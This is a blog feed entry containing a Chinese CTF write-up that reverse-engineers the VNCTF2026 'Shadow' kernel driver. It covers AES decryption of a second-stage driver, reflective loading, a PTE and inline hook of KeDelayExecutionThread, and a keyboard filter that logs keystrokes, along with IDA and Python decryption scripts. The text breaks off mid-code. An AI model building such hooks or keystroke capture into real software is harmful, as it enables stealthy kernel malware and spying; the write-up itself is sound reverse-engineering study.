<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2026-02-23T14:29:47.560Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VNCTF2026 Shadow分析[驱动分析+反射注入]</title>
    <link href="http://matriy330.github.io/fe2f4500/"/>
    <id>http://matriy330.github.io/fe2f4500/</id>
    <published>2026-02-23T14:29:34.000Z</published>
    <updated>2026-02-23T14:29:47.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shadow"><a href="#Shadow" class="headerlink" title="Shadow"></a>Shadow</h1><p><a href="https://tkazer.github.io/2026/02/02/VNCTF2026-Shadow-WP/">VNCTF2026-Shadow-WP | Liv’s blog</a></p><p>Maze.exe一个简单迷宫</p><p>sys分析下</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233212444.png" alt="image-20260215233212444"></p><p>Findcrypt发现AES</p><p>sub_14000C000从全局 Pool 拷贝 0x5E00 字节，然后调用 sub_140001168 做 16 字节分组变换</p><p>确认是 AES 轮函数（S-box 在 0x140004000，Rcon 在 0x140003070，密钥在 dword_14000A000）</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233457807.png" alt="image-20260215233457807"></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>AI搓个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge-specific RVAs from stage1 sys.</span></span><br><span class="line">KEY_RVA = <span class="number">0xA000</span></span><br><span class="line">ENC_BLOB_RVA = <span class="number">0x4200</span></span><br><span class="line">ENC_BLOB_SIZE = <span class="number">0x5E00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_rva_bytes</span>(<span class="params">pe: pefile.PE, rva: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    offset = pe.get_offset_from_rva(rva)</span><br><span class="line">    data = pe.__data__[offset : offset + size]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) != size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;read size mismatch @RVA <span class="subst">&#123;<span class="built_in">hex</span>(rva)&#125;</span>: got <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>, want <span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_pe_image</span>(<span class="params">buf: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">0x40</span> <span class="keyword">or</span> buf[:<span class="number">2</span>] != <span class="string">b&quot;MZ&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(buf[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> e_lfanew + <span class="number">4</span> &lt;= <span class="built_in">len</span>(buf) <span class="keyword">and</span> buf[e_lfanew : e_lfanew + <span class="number">4</span>] == <span class="string">b&quot;PE\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Recover stage2 PE directly from stage1 .sys&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;sys_path&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;path to stage1 driver (.sys)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--out&quot;</span>, default=<span class="string">&quot;./stage2_driver.bin&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;output stage2 file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    pe = pefile.PE(args.sys_path, fast_load=<span class="literal">False</span>)</span><br><span class="line">    key = read_rva_bytes(pe, KEY_RVA, <span class="number">16</span>)</span><br><span class="line">    enc_blob = read_rva_bytes(pe, ENC_BLOB_RVA, ENC_BLOB_SIZE)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    cand_encrypt = cipher.encrypt(enc_blob)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.out, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cand_encrypt)</span><br><span class="line"></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(cand_encrypt[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cand_encrypt[:<span class="number">2</span>], cand_encrypt[e_lfanew : e_lfanew + <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>解密PE文件后，进行PE拉伸、重定位修复、IAT修复、调用DriverEntry，一系列操作进行手动加载该PE文件到内存中运行，具体实现原理可以网上搜”反射注入”，实际就是手动实现加载并运行程序。from liv</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220159318.png" alt="image-20260218220159318"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220229531.png" alt="image-20260218220229531"></p></blockquote><p>关注sub_140001C10函数</p><p>sub_140001C10中有个解码字符串函数</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218225543154.png" alt="image-20260218225543154"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_obf</span>(<span class="params">data, key</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        b[i] ^= ((i % <span class="number">0x0D</span>) + key) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line">arr1 = [</span><br><span class="line">    <span class="number">0xF1</span>,<span class="number">0xBB</span>,<span class="number">0xD9</span>,<span class="number">0xBD</span>,<span class="number">0xFA</span>,<span class="number">0xBF</span>,<span class="number">0xA5</span>,<span class="number">0xC1</span>,<span class="number">0xAE</span>,<span class="number">0xC3</span>,<span class="number">0xA5</span>,<span class="number">0xC5</span>,<span class="number">0xBF</span>,<span class="number">0xBA</span>,<span class="number">0xFE</span>,<span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0xC5</span>,<span class="number">0xBE</span>,<span class="number">0xDA</span>,<span class="number">0xC0</span>,<span class="number">0xA2</span>,<span class="number">0xC2</span>,<span class="number">0xB6</span>,<span class="number">0xC4</span>,<span class="number">0xB1</span>,<span class="number">0xC6</span>,<span class="number">0xD3</span>,<span class="number">0xBB</span>,<span class="number">0xD3</span>,<span class="number">0xBD</span>,<span class="number">0xD0</span>,<span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x94</span>,<span class="number">0xC1</span>,<span class="number">0xAA</span>,<span class="number">0xC3</span>,<span class="number">0xB6</span>,<span class="number">0xC5</span>,<span class="number">0xA3</span>,<span class="number">0xBA</span>,<span class="number">0xDA</span>,<span class="number">0xBC</span>,<span class="number">0xD9</span>,<span class="number">0xBE</span>,<span class="number">0xBF</span>,<span class="number">0xC0</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr1, <span class="number">0xBA</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">arr2 = [</span><br><span class="line">    <span class="number">0xCC</span>,<span class="number">0x91</span>,<span class="number">0xD6</span>,<span class="number">0x93</span>,<span class="number">0xF1</span>,<span class="number">0x95</span>,<span class="number">0xE0</span>,<span class="number">0x97</span>,<span class="number">0xF1</span>,<span class="number">0x99</span>,<span class="number">0xF9</span>,<span class="number">0x9B</span>,<span class="number">0xF9</span>,<span class="number">0x90</span>,<span class="number">0xCD</span>,<span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0xD8</span>,<span class="number">0x94</span>,<span class="number">0xF0</span>,<span class="number">0x96</span>,<span class="number">0xEE</span>,<span class="number">0x98</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0xF4</span>,<span class="number">0x9C</span>,<span class="number">0xF1</span>,<span class="number">0x91</span>,<span class="number">0xE0</span>,<span class="number">0x93</span>,<span class="number">0xF0</span>,<span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0xD5</span>,<span class="number">0x97</span>,<span class="number">0xF4</span>,<span class="number">0x99</span>,<span class="number">0xFB</span>,<span class="number">0x9B</span>,<span class="number">0xEF</span>,<span class="number">0x90</span>,<span class="number">0xE2</span>,<span class="number">0x92</span>,<span class="number">0xA3</span>,<span class="number">0x94</span>,<span class="number">0x95</span>,<span class="number">0x96</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr2, <span class="number">0x90</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p>在 sub_140001C10 中解码出两个关键字符串：</p><ul><li>KeDelayExecutionThread</li><li>\Device\KeyboardClass0</li></ul><p>0x61004D 的内存字节是：4D 00 61 00 -&gt; UTF-16LE 就是 “M” “a”</p><p>0x65007A 的内存字节是：7A 00 65 00 -&gt; UTF-16LE 就是 “z” “e”</p><p>枚举 PID 12..0xFFFFF，通过 SeLocateProcessImageName 找进程名为 Maze（比较 M a z e）。</p><p>SystemRoutineAddress &#x3D; MmGetSystemRoutineAddress(&amp;DestinationString);</p><blockquote><p>在内核里按名字查找 KeDelayExecutionThread 这个系统例程的地址</p><p><code>MmGetSystemRoutineAddress</code> 是 Windows 内核提供的一个函数。</p><p>根据函数名字符串，返回该内核导出函数的地址。类似于用户态里的GetProcAddress</p><p>KeDelayExecutionThread 让当前线程延迟一段时间</p></blockquote><p>找到后调用 sub_140003F80 安装 hook；</p><ul><li>创建设备对象（IoCreateDevice，类型 0x0B &#x3D; 键盘）并 IoAttachDevice 到 \Device\KeyboardClass0。</li><li>MajorFunction 默认走 sub_1400010A0（直接转发）。</li><li>IRP_MJ_READ（索引 3）走 sub_140001100，设置 completion routine CompletionRoutine (0x1400017D0) 后转发。</li></ul><p>sub_140003F80 本质上是“安装内联 Hook + 建立可恢复上下文”的函数。在当前样本里它是给 KeDelayExecutionThread 装钩子（由 sub_140001C10 传进来）。</p><p>它主要做这几件事：</p><ol><li>PsLookupProcessByProcessId 拿到目标进程（Maze）的 PEPROCESS。</li><li>分配一个上下文结构（0xC0），调用 sub_140003B50 做页表相关准备（含保存原始页表项、必要时处理大页&#x2F;重映射）。</li><li>用 sub_140002470 从目标函数入口开始反汇编，累计到至少 14 字节（保证覆盖完整指令）。</li><li>保存原始前导字节，并构造 trampoline（原始字节 + 跳回 原函数+len），把 trampoline 指针写到 *a5。</li><li>构造 14 字节跳板并写回目标函数入口（sub_140003E80）：<br>FF 25 00 00 00 00 + 8字节hook地址（这里是 sub_1400012C0）。</li><li>把上下文挂到全局链表（供卸载时恢复），成功返回 1；任一步失败返回 0。</li></ol><blockquote><p>然后对该进程，进行对KeDelayExecutionThread函数单独隔离的Pte hook，Pte hook的特性就是对ntdll函数进行hook，但仅对该进程生效，hook替换成另一个函数。<a href="https://xz.aliyun.com/news/18999">PTE Hook：一种利用页表重映射攻击实现的内核函数Hook-先知社区</a></p></blockquote><p>键盘数据处理</p><p>IoAttachDevice(DeviceObject, &amp;TargetDevice, &amp;AttachedDevice)这说明它把自己挂到键盘类设备栈上，做键盘过滤</p><p>Sub_140001100 是这个驱动专门处理 IRP_MJ_READ（读请求）的分发函数，本质是带回调的转发器</p><blockquote><p>核心回调就是CompletionRoutine函数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232308422.png" alt="image-20260218232308422"></p><p>返回缓冲按 KEYBOARD_INPUT_DATA 解析：count &#x3D; IoStatus.Information &#x2F; 0xC。</p><p>逐条读取扫描码 n0x54 和标志位：</p><ul><li>扫描码 0x2A&#x2F;0x36（左右 Shift）用于更新 byte_140006BA5（Shift 状态）。</li><li>只处理按下事件（Flags &amp; 1 &#x3D;&#x3D; 0），忽略松开事件。</li></ul><p>扫描码转字符：</p><ul><li>未按 Shift 用 byte_140005170。</li><li>按 Shift 用 byte_1400051D0。</li></ul><p>若转换出字符且采集开关 byte_140006BA4 为真，就写入 Source2[dword_140006BA8++]。</p><p>扫描码 0x58（F12）作为采集开关：</p><ul><li>打开时：清空 Source2 和长度，打印 “[LDriver] on input.\n”（字符串先解码）。</li><li>关闭时：打印 “[LDriver] input end.\n”（同样先解码）。</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232355910.png" alt="image-20260218232355910"></p></blockquote><p>交叉引用该函数可以到sub_1400012C0</p><p>分析逻辑可得解密代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import ida_bytes, ida_name</span><br><span class="line"></span><br><span class="line">out_path = r<span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">parts = [</span><br><span class="line">  (<span class="string">&#x27;src_&#x27;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&#x27;src__0&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&#x27;src__1&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&#x27;src__2&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&#x27;src__3&#x27;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> name, size, xk in parts:</span><br><span class="line">  ea = ida_name.get_name_ea(<span class="number">0xffffffffffffffff</span>, name)</span><br><span class="line">  b = bytearray(ida_bytes.get_bytes(ea, size))</span><br><span class="line">  b.reverse()</span><br><span class="line">  <span class="keyword">for</span> i in range(len(b)):</span><br><span class="line">      b[i] ^= xk</span><br><span class="line">  blob.extend(b)</span><br><span class="line"></span><br><span class="line">with open(out_path, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">  f.write(blob)</span><br><span class="line"></span><br><span class="line">entry_off = <span class="number">0x775</span></span><br><span class="line">print(hex(entry_off), blob[entry_off:entry_off+<span class="number">32</span>].hex(), len(blob))</span><br></pre></td></tr></table></figure><p>或者直接重建在当前文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"></span><br><span class="line">PARTS = [</span><br><span class="line">  (<span class="string">&quot;src_&quot;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&quot;src__0&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&quot;src__1&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&quot;src__2&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&quot;src__3&quot;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">FUNC_OFFSETS = [<span class="number">0x000</span>, <span class="number">0x055</span>, <span class="number">0x1AD</span>, <span class="number">0x225</span>, <span class="number">0x392</span>, <span class="number">0x476</span>, <span class="number">0x775</span>, <span class="number">0x862</span>]</span><br><span class="line">FUNC_NAMES = [</span><br><span class="line">  <span class="string">&quot;shc_xorshift&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_init_sbox&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_subword&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_expand_keys&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_mix_seed&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_crypt_block&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_main&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rebuild_blob</span>():</span><br><span class="line">  blob = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> name, size, xk <span class="keyword">in</span> PARTS:</span><br><span class="line">      ea = ida_name.get_name_ea(<span class="number">0xFFFFFFFFFFFFFFFF</span>, name)</span><br><span class="line">      <span class="keyword">if</span> ea == <span class="number">0xFFFFFFFFFFFFFFFF</span>:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;missing symbol: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      b = ida_bytes.get_bytes(ea, size)</span><br><span class="line">      <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(b) != size:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;read fail: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      t = <span class="built_in">bytearray</span>(b)</span><br><span class="line">      t.reverse()                 <span class="comment"># sub_140001B60</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">          t[i] ^= xk              <span class="comment"># 每段固定异或</span></span><br><span class="line">      blob.extend(t)</span><br><span class="line">  <span class="keyword">return</span> blob</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_blob</span>(<span class="params">blob, base=<span class="number">0x180020000</span>, seg_name=<span class="string">&quot;shc0&quot;</span></span>):</span><br><span class="line">  seg = ida_segment.getseg(base)</span><br><span class="line">  <span class="keyword">if</span> seg:</span><br><span class="line">      ida_segment.del_segm(base, ida_segment.SEGMOD_KILL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 64-bit CODE 段</span></span><br><span class="line">  ok = idc.AddSeg(base, base + <span class="built_in">len</span>(blob), <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;AddSeg failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">  idc.set_segm_name(base, seg_name)</span><br><span class="line">  idc.set_segm_class(base, <span class="string">&quot;CODE&quot;</span>)</span><br><span class="line">  ida_bytes.patch_bytes(base, <span class="built_in">bytes</span>(blob))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FUNC_OFFSETS) - <span class="number">1</span>):</span><br><span class="line">      s = base + FUNC_OFFSETS[i]</span><br><span class="line">      e = base + FUNC_OFFSETS[i + <span class="number">1</span>]</span><br><span class="line">      ida_funcs.del_func(s)</span><br><span class="line">      ida_bytes.del_items(s, ida_bytes.DELIT_SIMPLE, e - s)</span><br><span class="line">      idc.create_insn(s)</span><br><span class="line">      ida_funcs.add_func(s, e)</span><br><span class="line">      idc.set_name(s, FUNC_NAMES[i], idc.SN_CHECK)</span><br><span class="line"></span><br><span class="line">  ida_auto.auto_wait()</span><br><span class="line">  <span class="keyword">return</span> base + <span class="number">0x775</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  blob = rebuild_blob()</span><br><span class="line">  out_path = <span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(blob)</span><br><span class="line"></span><br><span class="line">  entry = map_blob(blob)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;blob_len =&quot;</span>, <span class="built_in">len</span>(blob))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;dump =&quot;</span>, out_path)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry =&quot;</span>, <span class="built_in">hex</span>(entry))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry_32 =&quot;</span>, blob[<span class="number">0x775</span>:<span class="number">0x775</span>+<span class="number">32</span>].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>sub_1400012C0 会先重建一段代码 blob（你说的 shellcode）</p><ul><li>5 段数据拼接：长度分别 0x1AD, 0x1AD, 0x1AD, 0x1AD, 0x1AE</li><li>每段都先 reverse，再异或常量（对应 0x11&#x2F;0x22&#x2F;0x33&#x2F;0x44&#x2F;0x55）</li><li>总长度 0x862，入口偏移是 +0x775</li></ul><p>key</p><ul><li>先初始化：seed &#x3D; 0x17658990C729C992</li><li>循环 0x39 次：seed &#x3D; (seed * 0x10003) ^ <em>(uint64_t</em>)a3</li><li>这里 a3 是传入的指针，取的是 *a3 的 64 位值</li><li>然后把 &amp;seed 传给 blob 入口做 8 字节分组变换</li></ul><p>关键是得知道a3</p><p>sub_1400012C0(a1, a2, a3) 的 a3 来自被 hook 的原函数第三个参数。</p><p>这里被 hook 的函数是 KeDelayExecutionThread</p><p>所以参数映射是：</p><ul><li>a1 &#x3D; KPROCESSOR_MODE WaitMode</li><li>a2 &#x3D; BOOLEAN Alertable</li><li>a3 &#x3D; PLARGE_INTEGER Interval</li></ul><p>对 Maze.exe 的 Sleep(50)，常见对应是：</p><ul><li>*a3 &#x3D; -500000（即 -(50 * 10000)）</li><li>64 位补码：0xFFFFFFFFFFF85EE0</li></ul><p>密文</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260219204921174.png" alt="image-20260219204921174"></p><p>但是上面的那些不知道在干什么交叉引用发现实际对密文也进行了异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 